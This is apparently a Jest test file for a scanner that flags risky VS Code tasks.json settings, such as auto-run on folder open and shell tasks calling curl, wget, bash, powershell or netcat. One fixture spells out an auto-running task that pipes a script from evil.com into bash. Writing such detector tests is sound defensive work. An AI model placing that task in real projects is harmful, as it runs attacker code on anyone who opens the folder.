import { scanVSCodeTasks, VSCodeScanner } from '../../../src/heuristics/patterns/vscode';
import { RiskLevel, FindingCategory } from '../../../src/shared/types';
import * as fs from 'fs';
import * as path from 'path';

describe('VSCode Pattern Scanner', () => {
  const scanner = new VSCodeScanner();

  describe('appliesTo', () => {
    it('should apply to .vscode/tasks.json', () => {
      expect(scanner.appliesTo('.vscode/tasks.json')).toBe(true);
    });

    it('should apply to tasks.json at root', () => {
      expect(scanner.appliesTo('tasks.json')).toBe(true);
    });

    it('should not apply to package.json', () => {
      expect(scanner.appliesTo('package.json')).toBe(false);
    });

    it('should not apply to other json files', () => {
      expect(scanner.appliesTo('config.json')).toBe(false);
    });
  });

  describe('runOn: folderOpen detection', () => {
    it('should return RED finding for runOn: folderOpen', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Auto Run',
            type: 'shell',
            command: 'echo',
            args: ['hello'],
            runOptions: {
              runOn: 'folderOpen',
            },
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(1);
      expect(result.findings[0].riskLevel).toBe(RiskLevel.RED);
      expect(result.findings[0].description).toContain('runOn: folderOpen');
      expect(result.findings[0].category).toBe(FindingCategory.VSCODE);
    });

    it('should detect runOn: folderOpen with dangerous command', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Malicious Auto Run',
            type: 'shell',
            command: 'curl',
            args: ['https://evil.com/payload.sh', '|', 'bash'],
            runOptions: {
              runOn: 'folderOpen',
            },
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      // Should have RED for folderOpen (dangerous command is covered by the RED)
      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('folderOpen'))).toBe(true);
    });
  });

  describe('dangerous shell command detection', () => {
    it('should return YELLOW for shell task with curl', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Download Something',
            type: 'shell',
            command: 'curl',
            args: ['https://example.com/file.txt'],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('curl'))).toBe(true);
    });

    it('should return YELLOW for shell task with wget', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Download',
            type: 'shell',
            command: 'wget',
            args: ['https://example.com/file'],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('wget'))).toBe(true);
    });

    it('should return YELLOW for shell task with bash', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Run Script',
            type: 'shell',
            command: 'bash',
            args: ['script.sh'],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('bash'))).toBe(true);
    });

    it('should return YELLOW for shell task with powershell', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'PS Script',
            type: 'shell',
            command: 'powershell',
            args: ['-File', 'script.ps1'],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('powershell'))).toBe(true);
    });

    it('should return YELLOW for process task with netcat', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Network',
            type: 'process',
            command: 'nc',
            args: ['-l', '1234'],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('nc'))).toBe(true);
    });
  });

  describe('network call detection', () => {
    it('should detect network URLs in commands', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Fetch Data',
            type: 'shell',
            command: 'node',
            args: ['-e', "fetch('https://api.example.com')"],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings.some(f => f.description.includes('network'))).toBe(true);
    });
  });

  describe('safe tasks.json', () => {
    it('should return no findings for safe npm tasks', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Build',
            type: 'shell',
            command: 'npm',
            args: ['run', 'build'],
          },
          {
            label: 'Test',
            type: 'shell',
            command: 'npm',
            args: ['test'],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(0);
    });

    it('should return no findings for TypeScript compilation task', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'tsc build',
            type: 'typescript',
            tsconfig: 'tsconfig.json',
            problemMatcher: ['$tsc'],
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(0);
    });
  });

  describe('invalid JSON handling', () => {
    it('should return YELLOW parse error for invalid JSON', () => {
      const content = '{ invalid json }';

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(1);
      expect(result.findings[0].riskLevel).toBe(RiskLevel.YELLOW);
      expect(result.findings[0].category).toBe(FindingCategory.PARSE_ERROR);
      expect(result.findings[0].description).toContain('Invalid JSON');
    });

    it('should return YELLOW for truncated JSON', () => {
      const content = '{"version": "2.0.0", "tasks": [{"label": "test"';

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(1);
      expect(result.findings[0].riskLevel).toBe(RiskLevel.YELLOW);
      expect(result.findings[0].category).toBe(FindingCategory.PARSE_ERROR);
    });
  });

  describe('empty tasks array', () => {
    it('should return GREEN (no findings) for empty tasks array', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [],
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(0);
    });

    it('should return no findings for missing tasks property', () => {
      const content = JSON.stringify({
        version: '2.0.0',
      });

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(0);
    });
  });

  describe('fixture files', () => {
    it('should detect malicious patterns in malicious-tasks.json fixture', () => {
      const fixturePath = path.join(__dirname, '../../fixtures/vscode/malicious-tasks.json');
      const content = fs.readFileSync(fixturePath, 'utf-8');

      const result = scanVSCodeTasks(content);

      // Should find RED for folderOpen
      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      // Should find multiple issues
      expect(result.findings.length).toBeGreaterThan(0);
    });

    it('should return no findings for safe-tasks.json fixture', () => {
      const fixturePath = path.join(__dirname, '../../fixtures/vscode/safe-tasks.json');
      const content = fs.readFileSync(fixturePath, 'utf-8');

      const result = scanVSCodeTasks(content);

      expect(result.findings).toHaveLength(0);
    });
  });

  describe('multiple tasks', () => {
    it('should detect findings in multiple tasks', () => {
      const content = JSON.stringify({
        version: '2.0.0',
        tasks: [
          {
            label: 'Safe Build',
            type: 'shell',
            command: 'npm',
            args: ['build'],
          },
          {
            label: 'Suspicious',
            type: 'shell',
            command: 'curl',
            args: ['https://example.com'],
          },
          {
            label: 'Auto Danger',
            type: 'shell',
            command: 'bash',
            args: ['evil.sh'],
            runOptions: { runOn: 'folderOpen' },
          },
        ],
      });

      const result = scanVSCodeTasks(content);

      // Should have findings for task 2 (curl) and task 3 (folderOpen + bash)
      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
    });
  });
});
